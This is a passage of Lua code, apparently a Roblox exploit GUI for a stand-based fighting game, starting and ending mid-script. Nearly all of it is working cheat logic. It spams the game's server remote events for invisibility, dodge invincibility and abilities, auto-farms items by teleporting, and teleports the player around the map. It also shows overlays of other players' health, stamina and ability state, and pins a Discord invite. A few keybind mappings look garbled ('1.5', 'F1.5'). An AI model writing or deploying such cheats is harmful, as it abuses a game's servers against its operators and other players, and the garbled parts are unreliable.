	local script = Instance.new('LocalScript', TextBox_2)

	while wait(0.1) do
		if script.Parent.Text ~= "discord.gg/p2H3w3v7Ns" then
			script.Parent.Text = "discord.gg/p2H3w3v7Ns"
		end
	end
end
coroutine.wrap(SGRYFKP_fake_script)()
local function XHOIYJC_fake_script() -- STWRTZButton.ButtonManager 
	local script = Instance.new('LocalScript', STWRTZButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("STWRTZ ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			local player = game.Players.LocalPlayer
			local function startLoop()
				coroutine.wrap(function()
					while on == true do
						local args = {
							[1] = "Alternate",
							[2] = "STWRTZ",
							[3] = true
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
						wait(1)
					end
				end)()
			end
	
			startLoop()
	
			player.CharacterAdded:Connect(function()
				startLoop()
			end)
			
		elseif on == true then
			
			local player = game.Players.LocalPlayer
			local function startLoop()
				coroutine.wrap(function()
						local args = {
							[1] = "Alternate",
							[2] = "STWRTZ",
							[3] = false
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
				end)()
			end
	
			startLoop()
	
			player.CharacterAdded:Connect(function()
				startLoop()
			end)
			
			on = false
			off = true
			print("STWRTZ OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(XHOIYJC_fake_script)()
local function LPDETHP_fake_script() -- STWRTZButton_2.ButtonManager 
	local script = Instance.new('LocalScript', STWRTZButton_2)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("GERRTZ ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			local player = game.Players.LocalPlayer
			local function startLoop()
				coroutine.wrap(function()
					while on == true do
						local args = {
							[1] = "Alternate",
							[2] = "RTZ",
							[3] = true
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
						wait(1)
					end
				end)()
			end
	
			startLoop()
	
			player.CharacterAdded:Connect(function()
				startLoop()
			end)
			
		elseif on == true then
			
			local player = game.Players.LocalPlayer
				coroutine.wrap(function()
						local args = {
							[1] = "Alternate",
							[2] = "RTZ",
							[3] = false
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
			end)()
			on = false
			off = true
			print("GERRTZ OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(LPDETHP_fake_script)()
local function WQXQQAJ_fake_script() -- D4CClonesButton.ButtonManager 
	local script = Instance.new('LocalScript', D4CClonesButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("D4CCLONES ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			
			local UserInputService = game:GetService("UserInputService")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
			local InputEvent = ReplicatedStorage:WaitForChild("Main"):WaitForChild("Input")
			local DeathEvent = ReplicatedStorage:WaitForChild("Main"):WaitForChild("Death")
	
			local holdingF2 = false
			local holdingF3 = false
			local holdingF4 = false
			local repeatRate = 0.2
	
			task.spawn(function()
				while true do
					if holdingF3 then
						local args = {
							[1] = "Alternate",
							[2] = "Clone"
						}
						InputEvent:FireServer(unpack(args))
					end
					task.wait(repeatRate)
				end
			end)
	
			task.spawn(function()
				while true do
					if holdingF2 then
						local args = {
							[1] = "Alternate",
							[2] = "Death"
						}
						DeathEvent:FireServer(unpack(args))
					end
					task.wait(repeatRate)
				end
			end)
	
			task.spawn(function()
				while true do
					if holdingF4 then
							for _, obj in pairs(game.Workspace:GetChildren()) do
								if obj:FindFirstChild('Owner') then obj:Destroy() end
							end
					end
					task.wait(repeatRate)
				end
			end)
	
			UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if input.KeyCode == Enum.KeyCode.F3 then
					holdingF3 = true
				elseif input.KeyCode == Enum.KeyCode.F2 then
					holdingF2 = true
				elseif input.KeyCode == Enum.KeyCode.F4 then
				holdingF4 = true
				end
			end)
	
			UserInputService.InputEnded:Connect(function(input)
				if input.KeyCode == Enum.KeyCode.F3 then
					holdingF3 = false
				elseif input.KeyCode == Enum.KeyCode.F2 then
					holdingF2 = false
				elseif input.KeyCode == Enum.KeyCode.F4 then
					holdingF4 = false
				end
			end)
			
		elseif on == true then 
			on = false
			off = true
			print("D4CCLONES OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(WQXQQAJ_fake_script)()
local function FXMAVWZ_fake_script() -- InvisStandButton.ButtonManager 
	local script = Instance.new('LocalScript', InvisStandButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("INVISIBLE STAND ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			while on == true do
				wait()
				local args = {
					"Alternate",
					"Appear",
					true
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
	
			end
		elseif on == true then
			on = false
			off = true
			local args = {
				"Alternate",
				"Appear",
				false
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
			print("INVISIBLE STAND OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(FXMAVWZ_fake_script)()
local function CXQY_fake_script() -- AutofarmButton.ButtonManager 
	local script = Instance.new('LocalScript', AutofarmButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local toggleConnection
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("AUTOFARM ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			local player = game.Players.LocalPlayer
			
			while on == true do
	local spawner = game.Map["Farming Zone"]:FindFirstChild("Spawner")
if not spawner then
	warn("Spawner not found in Farming Zone")
	return
end

local function moveToSpawner()
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		-- Teleport to the Spawner's CFrame
		player.Character.HumanoidRootPart.CFrame = spawner.CFrame
	end
end

-- Ensure Arrow is in Character
local arrowTool = player.Character:FindFirstChild("Arrow") or player.Backpack:FindFirstChild("Arrow")
if not player.Character:FindFirstChild("Arrow") and arrowTool then
	arrowTool.Parent = player.Character
elseif not arrowTool then
	moveToSpawner()
end

-- Ensure Rokaka Fruit is in Character
local rokakaFruitTool = player.Character:FindFirstChild("Rokaka Fruit") or player.Backpack:FindFirstChild("Rokaka Fruit")
if not player.Character:FindFirstChild("Rokaka Fruit") and rokakaFruitTool then
	rokakaFruitTool.Parent = player.Character
elseif not rokakaFruitTool then
	moveToSpawner()
end

-- Use Arrow if conditions match
local standValue = player.Data.Stand.Value
local targetStandValue = script.Parent.Parent.TextLabel.Stand.Text

if player.Character:FindFirstChild("Arrow") and standValue == 1 and standValue ~= targetStandValue then
	game:GetService("ReplicatedStorage"):WaitForChild("ItemEvents"):WaitForChild("Arrow"):FireServer()
end

-- Use Rokaka Fruit if conditions match
if player.Character:FindFirstChild("Rokaka Fruit") and standValue == 1 and standValue ~= targetStandValue then
	game:GetService("ReplicatedStorage"):WaitForChild("ItemEvents"):WaitForChild("Roka"):FireServer()
end

-- Teleport to custom position if no items are found (e.g., Arrow or Rokaka Fruit)
player.Character.HumanoidRootPart.CFrame = CFrame.new(-285, 511, -1486)


	
				wait(1.5)
			end
	
		elseif on == true then
			on = false
			off = true
			print("AUTOFARM OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(CXQY_fake_script)()
local function SBEO_fake_script() -- Stand.ReturnToOrigin 
	local script = Instance.new('LocalScript', Stand)

	local textBox = script.Parent
	local typingDelay = 1.5 -- seconds before validating input
	
	-- Stand name (uppercase) -> ID
	local stands = {
		["STANDLESS"] = 1,
		["SP"] = 2,
		["SPSO"] = 3,
		["SPTW"] = 6969,
		["TW"] = 4,
		["CD"] = 5,
		["KQ"] = 6,
		["GE"] = 7,
		["DKC"] = 10,
		["TWAU"] = 11,
		["OMT"] = 14,
		["ANUBIS"] = 18,
		["HG"] = 19,
		["S&W"] = 25,
		["KCAU"] = 27,
		["S&WSHINY"] = 30,
		["SF"] = 34,
		["D4C"] = 44,
		["WS"] = 52,
		["WSAU"] = 60,
		["TWOVA"] = 10004
	}
	
	local lastInputTime = tick()
	
	-- Listen for text changes
	textBox:GetPropertyChangedSignal("Text"):Connect(function()
		lastInputTime = tick()
	end)
	
	while true do
		wait(0.1)
	
		if tick() - lastInputTime >= typingDelay then
			local input = textBox.Text:upper()
			local matched = false
	
			for name, id in pairs(stands) do
				if input:sub(1, #name) == name then
					textBox.Text = tostring(id)
					matched = true
					break
				end
			end
	
			if not matched then
				if input == "" then
					textBox.Text = "Stand here."
				else
					textBox.Text = "Invalid input."
				end
			end
	
			lastInputTime = math.huge -- Prevent repeated updates
		end
	end
	
end
coroutine.wrap(SBEO_fake_script)()
local function NNSQJ_fake_script() -- HealthBarsButton.ButtonManager 
	local script = Instance.new('LocalScript', HealthBarsButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("HEALTH BARS ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			while on == true do
				local TweenService = game:GetService("TweenService")
				local Players = game:GetService("Players")
	
				local function createOrUpdateStaminaGui(character, staminaValue)
					local head = character:FindFirstChild("Head")
					if not head then return end
	
					local existingGui = character:FindFirstChild("StaminaGui")
					local textLabel
	
					if existingGui then
						textLabel = existingGui:FindFirstChild("TextLabel")
					else
						local billboardGui = Instance.new("BillboardGui", head)
						billboardGui.Name = "StaminaGui"
						billboardGui.Size = UDim2.new(0, 150, 0, 50)
						billboardGui.StudsOffset = Vector3.new(0, 8, 0)
						billboardGui.AlwaysOnTop = true
	
						textLabel = Instance.new("TextLabel", billboardGui)
						textLabel.Size = UDim2.new(1, 0, 1, 0)
						textLabel.BackgroundTransparency = 0
						textLabel.BackgroundColor3 = Color3.new(0, 0, 1)
						textLabel.TextColor3 = Color3.new(1, 1, 1)
						textLabel.TextScaled = true
						textLabel.Font = Enum.Font.SourceSansBold
					end
	
					textLabel.Text = "Stamina: " .. staminaValue
				end
	
				local function getPlayerStamina(player)
					local playerPart = game.Workspace:FindFirstChild(player.Name)
					if playerPart then
						local maxStamina = playerPart:FindFirstChild("MaxStamina")
						if maxStamina then
							local stamina = maxStamina:FindFirstChild("Stamina")
							return stamina and stamina.Value or nil
						end
					end
					return nil
				end
	
				local function createBillboardGui(character)
					local humanoid = character:WaitForChild("Humanoid")
					local player = Players:GetPlayerFromCharacter(character)
					local staminaValue = getPlayerStamina(player)
	
					if staminaValue then
						createOrUpdateStaminaGui(character, staminaValue)
						return
					end
	
					local billboardGui = Instance.new("BillboardGui", character.Head)
					billboardGui.Size = UDim2.new(0, 200, 0, 50)
					billboardGui.StudsOffset = Vector3.new(0, 3, 0)
	
					local textLabel = Instance.new("TextLabel", billboardGui)
					textLabel.Size = UDim2.new(1, 0, 1, 0)
					textLabel.BackgroundTransparency = 1
					textLabel.TextColor3 = Color3.new(1, 1, 1)
					textLabel.TextScaled = true
	
					local function updateHealth()
						while humanoid and humanoid.Health > 0 do
							local healthPercentage = (humanoid.Health / humanoid.MaxHealth) * 100
							textLabel.Text = string.format("Health: %.0f%%", healthPercentage)
	
							local color = Color3.new(1 - healthPercentage / 100, healthPercentage / 100, 0)
							TweenService:Create(textLabel, TweenInfo.new(0.5), {TextColor3 = color}):Play()
							wait(0.1)
						end
					end
	
					updateHealth()
				end
	
				Players.PlayerAdded:Connect(function(player)
					player.CharacterAdded:Connect(createBillboardGui)
				end)
	
				for _, player in ipairs(Players:GetPlayers()) do
					if player.Character then
						createBillboardGui(player.Character)
					end
				end
	
			end
		elseif on == true then
			on = false
			off = true
			print("HEALTH BARS OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(NNSQJ_fake_script)()
local function OTBQQFP_fake_script() -- Tab7_2.LocalScript 
	local script = Instance.new('LocalScript', Tab7_2)

	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local teleportLocations = {
		Middle = Vector3.new(1345, 623, -506),          -- Middle
		FarmZone = Vector3.new(-285, 511, -1486),       -- Farm Zone
		BasePlate = Vector3.new(-96, 25, -580),         -- Base Plate
		ZeldaMoon = Vector3.new(1346, 2208, 746),       -- Zelda Moon
		LoadingScreen = Vector3.new(2116, 670, -519),   -- Loading Screen
		StandChangerNpc = Vector3.new(1397, 590, -218), -- Stand Changer Npc
		ArenaLeft = Vector3.new(1316, 633, -280),       -- Arena Left
		ArenaRight = Vector3.new(1178, 633, -280),      -- Arena Right
		RachaelHouse = Vector3.new(1037, 633, -183),    -- Rachael House
		Waterfall = Vector3.new(1628, 623, -747),       -- Waterfall
		BossEntrance = Vector3.new(1124, 624, -741),    -- Boss Entrance
		D4C = Vector3.new(-3092, 500, -440)              -- D4C
	}
	
	local function teleportTo(coords)
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
		humanoidRootPart.CFrame = CFrame.new(coords)
	end
	
	local TPButtonMiddle = script.Parent.TPButtonMiddle
	TPButtonMiddle.Activated:Connect(function() teleportTo(teleportLocations.Middle) end)
	
	local TPButtonFarmZone = script.Parent.TPButtonFarmZone
	TPButtonFarmZone.Activated:Connect(function() teleportTo(teleportLocations.FarmZone) end)
	
	local TPButtonBasePlate = script.Parent.TPButtonBasePlate
	TPButtonBasePlate.Activated:Connect(function() teleportTo(teleportLocations.BasePlate) end)
	
	local TPButtonZeldaMoon = script.Parent.TPButtonZeldaMoon
	TPButtonZeldaMoon.Activated:Connect(function() teleportTo(teleportLocations.ZeldaMoon) end)
	
	local TPButtonLoadingScreen = script.Parent.TPButtonLoadingScreen
	TPButtonLoadingScreen.Activated:Connect(function() teleportTo(teleportLocations.LoadingScreen) end)
	
	local TPButtonStandChangerNpc = script.Parent.TPButtonStandChangerNpc
	TPButtonStandChangerNpc.Activated:Connect(function() teleportTo(teleportLocations.StandChangerNpc) end)
	
	local TPButtonArenaLeft = script.Parent.TPButtonArenaLeft
	TPButtonArenaLeft.Activated:Connect(function() teleportTo(teleportLocations.ArenaLeft) end)
	
	local TPButtonArenaRight = script.Parent.TPButtonArenaRight
	TPButtonArenaRight.Activated:Connect(function() teleportTo(teleportLocations.ArenaRight) end)
	
	local TPButtonRachaelHouse = script.Parent.TPButtonRachaelHouse
	TPButtonRachaelHouse.Activated:Connect(function() teleportTo(teleportLocations.RachaelHouse) end)
	
	local TPButtonWaterfall = script.Parent.TPButtonWaterfall
	TPButtonWaterfall.Activated:Connect(function() teleportTo(teleportLocations.Waterfall) end)
	
	local TPButtonBossEntrance = script.Parent.TPButtonBossEntrance
	TPButtonBossEntrance.Activated:Connect(function() teleportTo(teleportLocations.BossEntrance) end)
	
	local TPButtonD4C = script.Parent.TPButtonD4C
	TPButtonD4C.Activated:Connect(function() teleportTo(teleportLocations.D4C) end)
end
coroutine.wrap(OTBQQFP_fake_script)()
local function AAGFYPD_fake_script() -- VTWKnifeButton.ButtonManager 
	local script = Instance.new('LocalScript', VTWKnifeButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local UIS = game:GetService("UserInputService")
	local KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
	
	local function getKeyCodeFromString(keyString)
		local keyName = keyString:match("Enum%.KeyCode%.(.+)")
		if keyName then
			local keyCode = Enum.KeyCode[keyName]
			if keyCode then
				return keyCode
			else
				error(keyName .. " is not a valid KeyCode")
			end
		else
			error("Keybind format is incorrect. Please use 'Enum.KeyCode.<KeyName>'")
		end
	end
	
	while not KEYBIND:match("Enum%.KeyCode%.") do
		wait(0.1)
		KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
	end
	
	local keyCode = getKeyCodeFromString(KEYBIND)
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("VTW KNIFE ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	
			while on == true do
				wait()
				UIS.InputBegan:Connect(function(ip, gpe)
					if ip.KeyCode == keyCode then
						local player = game.Players.LocalPlayer
						local mouse = player:GetMouse()
	
						local args = {
							"Alternate",
							"Knife",
							vector.create(mouse.Hit.p.x, mouse.Hit.p.y, mouse.Hit.p.z)
						}
	
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
					end
				end)
			end
			while on == true do
				UIS.InputBegan:Connect(function(ip, gpe)
					if ip.KeyCode == Enum.KeyCode.K then
						game.Workspace.Effects:ClearAllChildren()
					end
				end)
			end
		elseif on == true then
			on = false
			off = true
			print("VTW KNIFE OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(AAGFYPD_fake_script)()
local function CZABU_fake_script() -- Keybind_2.ReturnToOrigin 
	local script = Instance.new('LocalScript', Keybind_2)

	local textBox = script.Parent
	
	while wait() do
		local text = textBox.Text
	
		if text == "" then
			wait(1.5)
			textBox.Text = "Keybind here."
		elseif text == "b" or text == "B" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.B"
		elseif text == "c" or text == "C" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.C"
		elseif text == "e" or text == "E" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.E"
		elseif text == "f" or text == "F" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F"
		elseif text == "g" or text == "G" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.G"
		elseif text == "h" or text == "H" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.H"
		elseif text == "i" or text == "I" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.I"
		elseif text == "j" or text == "J" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.J"
		elseif text == "k" or text == "K" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.K"
		elseif text == "l" or text == "L" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.L"
		elseif text == "m" or text == "M" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.M"
		elseif text == "n" or text == "N" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.N"
		elseif text == "o" or text == "O" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.O"
		elseif text == "p" or text == "P" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.P"
		elseif text == "q" or text == "Q" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Q"
		elseif text == "r" or text == "R" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.R"
		elseif text == "t" or text == "T" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.T"
		elseif text == "u" or text == "U" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.U"
		elseif text == "v" or text == "V" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.V"
		elseif text == "x" or text == "X" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.X"
		elseif text == "y" or text == "Y" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Y"
		elseif text == "z" or text == "Z" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Z"
		elseif text == "1" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.One"
		elseif text == "2" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Two"
		elseif text == "3" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Three"
		elseif text == "4" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Four"
		elseif text == "5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Five"
		elseif text == "6" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Six"
		elseif text == "7" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Seven"
		elseif text == "8" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Eight"
		elseif text == "9" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Nine"
		elseif text == "0" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Zero"
		elseif text == "F1" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F1"
		elseif text == "F2" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F2"
		elseif text == "F3" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F3"
		elseif text == "F4" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F4"
		elseif text == "F5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F5"
		elseif text == "F6" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F6"
		elseif text == "F7" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F7"
		elseif text == "F8" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F8"
		elseif text == "F9" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F9"
		elseif text == "F10" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F10"
		elseif text == "F11" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F11"
		elseif text == "F12" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F12"
		end
	end
	
	
end
coroutine.wrap(CZABU_fake_script)()
local function THGBD_fake_script() -- OniIFramesButton.ButtonManager 
	local script = Instance.new('LocalScript', OniIFramesButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("ONI IFRAMES ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			while on == true do
				wait()
				local args = {
					"Alternate",
					"Dodge"
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
			end
		elseif on == true then
			on = false
			off = true
			print("ONI IFRAMES OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(THGBD_fake_script)()
local function HCZXOVW_fake_script() -- EpiWarningButton.ButtonManager 
	local script = Instance.new('LocalScript', EpiWarningButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local toggleConnection
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("EPITAPH WARNING ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	while on == true do
		wait()
				local Players = game:GetService("Players")
	
				-- Function to create a BillboardGui
				local function createBillboardGui(character)
					local head = character:WaitForChild("Head")
	
					-- Create BillboardGui
					local billboardGui = Instance.new("BillboardGui")
					billboardGui.Adornee = head
					billboardGui.Size = UDim2.new(0, 100, 0, 50)
					billboardGui.StudsOffset = Vector3.new(0, 2, 0) -- Offset above the head
	
					-- Create TextLabel
					local textLabel = Instance.new("TextLabel")
					textLabel.Size = UDim2.new(1, 0, 1, 0)
					textLabel.BackgroundTransparency = 1
					textLabel.TextColor3 = Color3.new(1, 1, 1) -- White text
					textLabel.TextScaled = true
					textLabel.Name = "TextLabel" -- Name the TextLabel for easy access
	
					-- Parent the TextLabel to the BillboardGui
					textLabel.Parent = billboardGui
					billboardGui.Parent = head
	
					-- Update the text based on the Epitaphing value
					local epitaphing = character:FindFirstChild("Epitaphing")
					if epitaphing and epitaphing:IsA("BoolValue") then
						textLabel.Text = "Epitaphing: " .. tostring(epitaphing.Value)
	
						-- Update the text when the Epitaphing value changes
						epitaphing:GetPropertyChangedSignal("Value"):Connect(function()
							textLabel.Text = "Epitaphing: " .. tostring(epitaphing.Value)
						end)
					else
						textLabel.Text = "Epitaphing: false" -- Default if Epitaphing doesn't exist or is not a BoolValue
					end
				end
	
				-- Function to handle character added
				local function onCharacterAdded(player)
					player.CharacterAdded:Connect(function(character)
						wait(1) -- Wait for the character to fully load
						createBillboardGui(character)
					end)
				end
	
				-- Iterate through all players currently in the game
				for _, player in ipairs(Players:GetChildren()) do
					if player:IsA("Player") then
						onCharacterAdded(player)
						if player.Character then
							createBillboardGui(player.Character)
						end
					end
				end
	
				-- Connect to PlayerAdded event to check when players join
				Players.PlayerAdded:Connect(function(player)
					onCharacterAdded(player)
				end)
	end
		elseif on == true then
			on = false
			off = true
			print("EPITAPH WARNING OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(HCZXOVW_fake_script)()
local function QCXESJU_fake_script() -- ESplashButton.ButtonManager 
	local script = Instance.new('LocalScript', ESplashButton)

	local ESB = script.Parent
	local on = false
	local off = true
	local UIS = game:GetService("UserInputService")
	local KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
	
	local function getKeyCodeFromString(keyString)
		local keyName = keyString:match("Enum%.KeyCode%.(.+)")
		if keyName then
			local keyCode = Enum.KeyCode[keyName]
			if keyCode then
				return keyCode
			else
				error(keyName .. " is not a valid KeyCode")
			end
		else
			error("Keybind format is incorrect. Please use 'Enum.KeyCode.<KeyName>'")
		end
	end
	
	while not KEYBIND:match("Enum%.KeyCode%.") do
		wait(0.1)
		KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
	end
	
	local keyCode = getKeyCodeFromString(KEYBIND)
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("EMERALD SPLASH ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	
			while on == true do
				wait()
				UIS.InputBegan:Connect(function(ip, gpe)
					if ip.KeyCode == keyCode then
						local args = {
							[1] = "Alternate",
							[2] = "EmeraldProjectile2",
							[3] = false,
							[4] = game.Players.LocalPlayer:GetMouse().Hit
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
	
						wait(0.75)
						game.Workspace:WaitForChild("Effects"):ClearAllChildren()
					end
				end)
			end
		elseif on == true then
			on = false
			off = true
			print("EMERALD SPLASH OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(QCXESJU_fake_script)()
local function FLMGG_fake_script() -- Keybind_3.ReturnToOrigin 
	local script = Instance.new('LocalScript', Keybind_3)

	local textBox = script.Parent
	
	while wait() do
		local text = textBox.Text
	
		if text == "" then
			wait(1.5)
			textBox.Text = "Keybind here."
		elseif text == "b" or text == "B" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.B"
		elseif text == "c" or text == "C" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.C"
		elseif text == "e" or text == "E" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.E"
		elseif text == "f" or text == "F" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F"
		elseif text == "g" or text == "G" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.G"
		elseif text == "h" or text == "H" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.H"
		elseif text == "i" or text == "I" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.I"
		elseif text == "j" or text == "J" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.J"
		elseif text == "k" or text == "K" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.K"
		elseif text == "l" or text == "L" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.L"
		elseif text == "m" or text == "M" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.M"
		elseif text == "n" or text == "N" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.N"
		elseif text == "o" or text == "O" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.O"
		elseif text == "p" or text == "P" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.P"
		elseif text == "q" or text == "Q" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Q"
		elseif text == "r" or text == "R" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.R"
		elseif text == "t" or text == "T" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.T"
		elseif text == "u" or text == "U" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.U"
		elseif text == "v" or text == "V" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.V"
		elseif text == "x" or text == "X" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.X"
		elseif text == "y" or text == "Y" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Y"
		elseif text == "z" or text == "Z" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Z"
		elseif text == "1.5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.One"
		elseif text == "2" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Two"
		elseif text == "3" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Three"
		elseif text == "4" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Four"
		elseif text == "5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Five"
		elseif text == "6" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Six"
		elseif text == "7" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Seven"
		elseif text == "8" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Eight"
		elseif text == "9" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Nine"
		elseif text == "0" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Zero"
		elseif text == "F1.5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F1.5"
